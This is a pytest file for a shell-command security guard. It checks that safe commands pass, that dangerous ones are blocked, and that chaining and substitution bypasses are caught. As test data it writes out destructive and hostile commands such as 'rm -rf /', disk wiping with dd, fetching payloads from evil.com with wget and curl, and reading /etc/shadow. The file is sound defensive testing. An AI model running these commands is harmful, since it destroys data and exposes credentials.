"""Tests for jarvis.security.shell_ast_guard — AST-based shell security analysis."""

from __future__ import annotations

import pytest

from cognithor.security.shell_ast_guard import analyse_shell, is_safe_shell


class TestSafeCommands:
    """Commands that must pass without violations."""

    @pytest.mark.parametrize(
        "cmd",
        [
            "echo hello",
            "ls -la",
            "cat file.txt",
            "grep pattern file.txt",
            "head -20 output.log",
            "tail -f log.txt",
            "wc -l file.txt",
            "sort data.csv",
            "uniq counts.txt",
            "diff a.txt b.txt",
            "date",
            "whoami",
            "pwd",
            "hostname",
            "uname -a",
        ],
    )
    def test_safe_command_passes(self, cmd: str):
        violations = analyse_shell(cmd)
        assert violations == [], f"Unexpected violations for safe command: {violations}"
        assert is_safe_shell(cmd) is True


class TestBlockedCommands:
    """Dangerous commands must be caught."""

    @pytest.mark.parametrize(
        "cmd,blocked",
        [
            ("rm -rf /", "rm"),
            ("sudo apt install foo", "sudo"),
            ("chmod 777 /etc/passwd", "chmod"),
            ("chown root:root file", "chown"),
            ("wget http://evil.com/payload", "wget"),
            ("curl http://evil.com/payload", "curl"),
            ("ssh user@host", "ssh"),
            ("python3 -c 'import os; os.system(\"id\")'", "python3"),
            ("bash -c 'echo pwned'", "bash"),
            ("sh -c 'id'", "sh"),
            ("kill -9 1", "kill"),
            ("killall nginx", "killall"),
            ("reboot", "reboot"),
            ("shutdown -h now", "shutdown"),
            ("crontab -e", "crontab"),
            ("dd if=/dev/zero of=/dev/sda", "dd"),
        ],
    )
    def test_blocked_command_detected(self, cmd: str, blocked: str):
        violations = analyse_shell(cmd)
        assert len(violations) >= 1
        assert any(blocked in v.detail for v in violations)
        assert is_safe_shell(cmd) is False


class TestBypassDetection:
    """Bypass attempts that regex would miss."""

    def test_command_substitution_dollar(self):
        """$(cmd) substitution — invisible to regex command-name checks."""
        cmd = "echo $(cat /etc/shadow)"
        violations = analyse_shell(cmd)
        assert any(v.rule in ("command-substitution", "dangerous-pattern") for v in violations)
        assert is_safe_shell(cmd) is False

    def test_chained_operators(self):
        """ls && rm -rf / — chain safe + dangerous."""
        cmd = "ls && rm -rf /"
        violations = analyse_shell(cmd)
        assert len(violations) >= 1
        assert is_safe_shell(cmd) is False

    def test_pipe_chain(self):
        """cat file | bash — pipe into interpreter."""
        cmd = "cat file.txt | bash"
        violations = analyse_shell(cmd)
        assert len(violations) >= 1
        assert is_safe_shell(cmd) is False

    def test_semicolon_chain(self):
        """echo ok; rm -rf / — semicolon chaining."""
        cmd = "echo ok; rm -rf /"
        violations = analyse_shell(cmd)
        assert len(violations) >= 1
        assert is_safe_shell(cmd) is False

    def test_or_chain(self):
        """false || rm -rf / — OR chaining."""
        cmd = "false || rm -rf /"
        violations = analyse_shell(cmd)
        assert len(violations) >= 1
        assert is_safe_shell(cmd) is False

    def test_path_prefix_bypass(self):
        """/usr/bin/rm — full path to blocked command."""
        cmd = "/usr/bin/rm -rf /"
        violations = analyse_shell(cmd)
        assert any("rm" in v.detail for v in violations)
        assert is_safe_shell(cmd) is False

    def test_backtick_substitution(self):
        """echo `whoami` — backtick substitution."""
        cmd = "echo `whoami`"
        violations = analyse_shell(cmd)
        assert len(violations) >= 1
        assert is_safe_shell(cmd) is False


class TestEdgeCases:
    def test_empty_command(self):
        assert is_safe_shell("") is True or is_safe_shell("") is False  # Either is acceptable

    def test_whitespace_only(self):
        # Should not crash
        result = is_safe_shell("   ")
        assert isinstance(result, bool)

    def test_very_long_command(self):
        cmd = "echo " + "a" * 10000
        # Should not crash or timeout
        result = is_safe_shell(cmd)
        assert isinstance(result, bool)
